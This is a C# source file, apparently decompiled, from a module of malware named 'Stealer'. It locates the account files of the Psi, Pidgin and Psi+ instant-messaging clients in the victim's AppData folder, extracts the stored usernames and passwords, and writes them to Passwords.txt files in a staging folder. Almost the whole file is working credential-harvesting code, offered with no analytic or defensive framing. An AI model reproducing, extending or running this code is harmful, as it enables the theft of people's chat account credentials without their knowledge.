using System;
using System.IO;
using System.Xml;

namespace Stealer.modules
{
	// Token: 0x02000031 RID: 49
	internal class ImClient
	{
		// Token: 0x060000FE RID: 254 RVA: 0x0000BF0C File Offset: 0x0000A10C
		public static void GetImClients()
		{
			ImClient.GetPsi();
			ImClient.GetPidgin();
			ImClient.GetPsiPlus();
		}

		// Token: 0x060000FF RID: 255 RVA: 0x0000BF20 File Offset: 0x0000A120
		private static void GetPsi()
		{
			string text = Program.path + "\\IM";
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Psi\\profiles\\default\\accounts.xml";
			if (!File.Exists(text2))
			{
				return;
			}
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(text2);
			foreach (object obj in ((XmlElement)xmlDocument.GetElementsByTagName("accounts")[0]).GetElementsByTagName("a0"))
			{
				XmlElement xmlElement = (XmlElement)obj;
				try
				{
					string innerText = xmlElement.GetElementsByTagName("jid")[0].InnerText;
					if (xmlElement.GetElementsByTagName("password")[0].InnerText != null)
					{
						if (!Directory.Exists(text))
						{
							Directory.CreateDirectory(text);
							Directory.CreateDirectory(text + "\\Psi");
						}
						else
						{
							Directory.CreateDirectory(text + "\\Psi");
						}
						using (StreamWriter streamWriter = new StreamWriter(text + "\\Psi\\Passwords.txt", true))
						{
							streamWriter.WriteLine(string.Concat(new string[]
							{
								"\n[PASSWORDS]\nProtocol: ",
								xmlElement.GetElementsByTagName("resource")[0].InnerText,
								"\nUser: ",
								innerText,
								"\nPassword: ",
								xmlElement.GetElementsByTagName("password")[0].InnerText
							}));
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000100 RID: 256 RVA: 0x0000C104 File Offset: 0x0000A304
		private static void GetPidgin()
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.purple\\accounts.xml";
			string text2 = Program.path + "\\IM";
			if (!File.Exists(text))
			{
				return;
			}
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(text);
			foreach (object obj in xmlDocument.GetElementsByTagName("account")[0])
			{
				XmlElement xmlElement = (XmlElement)obj;
				try
				{
					if (xmlElement.GetElementsByTagName("password")[0].InnerText != null)
					{
						if (!Directory.Exists(text2))
						{
							Directory.CreateDirectory(text2);
							Directory.CreateDirectory(text2 + "\\Pidgin");
						}
						else
						{
							Directory.CreateDirectory(text2 + "\\Pidgin");
						}
						using (StreamWriter streamWriter = new StreamWriter(text2 + "\\Pidgin\\Passwords.txt", true))
						{
							streamWriter.WriteLine(string.Concat(new string[]
							{
								"\n[PASSWORDS]\nProtocol: ",
								xmlElement.GetElementsByTagName("protocol")[0].InnerText,
								"\nUser: ",
								xmlElement.GetElementsByTagName("name")[0].InnerText,
								"\nPassword: ",
								xmlElement.GetElementsByTagName("password")[0].InnerText
							}));
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000101 RID: 257 RVA: 0x0000C2D8 File Offset: 0x0000A4D8
		private static void GetPsiPlus()
		{
			string text = Program.path + "\\IM";
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Psi+\\profiles\\default\\accounts.xml";
			if (!File.Exists(text2))
			{
				return;
			}
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(text2);
			foreach (object obj in ((XmlElement)xmlDocument.GetElementsByTagName("accounts")[0]).GetElementsByTagName("a0"))
			{
				XmlElement xmlElement = (XmlElement)obj;
				try
				{
					string innerText = xmlElement.GetElementsByTagName("jid")[0].InnerText;
					if (xmlElement.GetElementsByTagName("password")[0].InnerText != null)
					{
						if (!Directory.Exists(text))
						{
							Directory.CreateDirectory(text);
							Directory.CreateDirectory(text + "\\Psi+");
						}
						else
						{
							Directory.CreateDirectory(text + "\\Psi+");
						}
						Console.WriteLine(xmlElement.GetElementsByTagName("password")[0].InnerText);
						Console.Read();
						using (StreamWriter streamWriter = new StreamWriter(text + "\\Psi+\\Passwords.txt", true))
						{
							streamWriter.WriteLine(string.Concat(new string[]
							{
								"\n[PASSWORDS]\nProtocol: ",
								xmlElement.GetElementsByTagName("resource")[0].InnerText,
								"\nUser: ",
								innerText,
								"\nPassword: ",
								xmlElement.GetElementsByTagName("password")[0].InnerText
							}));
						}
					}
				}
				catch
				{
				}
			}
		}
	}
}
